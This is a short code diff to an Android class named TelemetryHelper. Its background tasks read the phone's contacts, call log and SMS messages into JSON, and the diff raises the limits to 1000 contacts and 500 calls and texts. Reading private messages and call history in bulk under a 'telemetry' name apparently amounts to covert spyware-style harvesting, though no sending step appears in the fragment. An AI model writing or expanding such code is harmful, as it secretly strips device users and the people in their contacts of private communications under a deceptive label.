@@ -63,7 +63,7 @@ public class TelemetryHelper {
                             ContactsContract.CommonDataKinds.Phone.NUMBER
                     };
                     Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                            projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY + " ASC LIMIT 400");
+                            projection, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME_PRIMARY + " ASC LIMIT 1000");
                     if (c == null) return;
 
                     java.util.LinkedHashMap<String, JSONObject> map = new java.util.LinkedHashMap<>();
@@ -108,7 +108,7 @@ public class TelemetryHelper {
             public void run() {
                 try {
                     ContentResolver cr = context.getContentResolver();
-                    Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 100");
+                    Cursor c = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 500");
                     if (c == null) return;
 
                     JSONArray list = new JSONArray();
@@ -154,7 +154,7 @@ public class TelemetryHelper {
             public void run() {
                 try {
                     ContentResolver cr = context.getContentResolver();
-                    Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
+                    Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 500");
                     if (c == null) return;
 
                     JSONArray list = new JSONArray();
